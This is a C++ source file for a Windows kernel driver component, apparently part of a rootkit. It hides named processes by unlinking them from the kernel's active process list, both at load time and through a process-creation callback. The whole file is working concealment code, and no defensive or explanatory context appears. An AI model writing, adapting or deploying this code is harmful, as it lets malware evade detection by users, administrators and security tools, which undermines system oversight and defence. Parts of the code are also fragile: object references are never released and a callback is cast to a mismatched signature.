#include "ProcessHider.h"

#include <ntddk.h>

#pragma warning( disable : 4302 4311 )

namespace filter
{

	NTSTATUS ProcessHider::Register()
	{
		UNICODE_STRING PS_GET_PROCESS_IMAGE_FILE_NAME = RTL_CONSTANT_STRING(L"PsGetProcessImageFileName");
		gGetProcessImageFileName = (GET_PROCESS_IMAGE_NAME)
			MmGetSystemRoutineAddress(&PS_GET_PROCESS_IMAGE_FILE_NAME);

		KeInitializeGuardedMutex(&process_lock_);

		ProcessHider::HideOnInitializeOperation();

		NTSTATUS status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, FALSE);

		if (!NT_SUCCESS(status)) 
		{
			ProcessHider::Unload();
		}


		return status;
	}

	void ProcessHider::Unload()
	{
		PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)&ProcessHider::HideOnCreateOperation, TRUE);
	}

	bool ProcessHider::GetShortNameByPid(PWCHAR short_name, int size, HANDLE pid)
	{
		PEPROCESS eprocess;

		if (PsLookupProcessByProcessId(pid, &eprocess) != STATUS_SUCCESS)
		{
			return false;
		}

		PCHAR name = gGetProcessImageFileName(eprocess);

		for (int i = 0;; i++)
		{
			if (name[i] == 0)
			{
				short_name[i] = (WCHAR)name[i];
				break;
			}
			if (i >= size)
			{
				return false;
			}
			short_name[i] = (WCHAR)name[i];
		}

		return true;
	}

	bool ProcessHider::IsProcessInHiddenList(PWCHAR process_name)
	{
		return ulti::CheckEqualString(process_name, process_to_hide_);
	}

	void ProcessHider::HideOnInitializeOperation()
	{
		WCHAR process_name[MAX_SIZE];
		long long last_pid;
		PLIST_ENTRY next_p_list_entry_eprocess;

		P_CUSTOM_EPROCESS cur_p_eprocess = NULL, next_p_eprocess = NULL;

		if (PsLookupProcessByProcessId((HANDLE)SYSTEM_PID, (PEPROCESS *)&cur_p_eprocess) != STATUS_SUCCESS)
		{
			return;
		}

		last_pid = SYSTEM_PID;

		while (true)
		{
			HANDLE cur_pid = cur_p_eprocess->UniqueProcesId;

			last_pid = (long long)cur_pid;
			next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
			next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
			
			if (GetShortNameByPid(process_name, MAX_SIZE, cur_pid) == true)
			{
				if (IsProcessInHiddenList(process_name))
				{
					if (HideProcess(cur_p_eprocess) == true)
					{
						// DebugMessage("Hide process with PID %d and name %S", (int)cur_pid, process_name);
					}
				}
			}
			
			cur_p_eprocess = next_p_eprocess;
			if (cur_p_eprocess->UniqueProcesId == (HANDLE)SYSTEM_PID)
			{
				break;
			}
		}
	}

	void ProcessHider::HideOnCreateOperation(P_CUSTOM_EPROCESS peprocess, HANDLE pid, PPS_CREATE_NOTIFY_INFO create_info)
	{
		WCHAR msg[MAX_SIZE] = { 0 };
		WCHAR name[MAX_SIZE] = { 0 };

		if (create_info != NULL)
		{
			PUNICODE_STRING process_name = (PUNICODE_STRING)create_info->ImageFileName;
			
			if (ulti::GetNameWithoutDirectory(name, MAX_SIZE, process_name) == false)
			{
				return;
			}

			if (IsProcessInHiddenList(name))
			{
				bool status = false;

				status = HideProcess(peprocess);

				if (status == true)
				{
					// DebugMessage("Hide process on created with PID %d and name length %d, name %S", (int)pid, process_name->Length, name);
				}
			}
		}
	}


	bool ProcessHider::HideProcess(P_CUSTOM_EPROCESS peprocess)
	{

		P_CUSTOM_EPROCESS cur_p_eprocess, pre_p_eprocess, next_p_eprocess;
		PLIST_ENTRY pre_p_list_entry_eprocess, next_p_list_entry_eprocess;

		KeAcquireGuardedMutex(&process_lock_);

		cur_p_eprocess = peprocess;

		pre_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Blink;
		next_p_list_entry_eprocess = cur_p_eprocess->ActiveProcessLinks.Flink;
		pre_p_eprocess = CONTAINING_RECORD(pre_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
		next_p_eprocess = CONTAINING_RECORD(next_p_list_entry_eprocess, _CUSTOM_EPROCESS, ActiveProcessLinks);
		pre_p_eprocess->ActiveProcessLinks.Flink = next_p_list_entry_eprocess;
		next_p_eprocess->ActiveProcessLinks.Blink = pre_p_list_entry_eprocess;
		
		cur_p_eprocess->ActiveProcessLinks.Blink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);
		cur_p_eprocess->ActiveProcessLinks.Flink = (PLIST_ENTRY)&(peprocess->ActiveProcessLinks.Flink);

		KeReleaseGuardedMutex(&process_lock_);

		return true;
	}

}
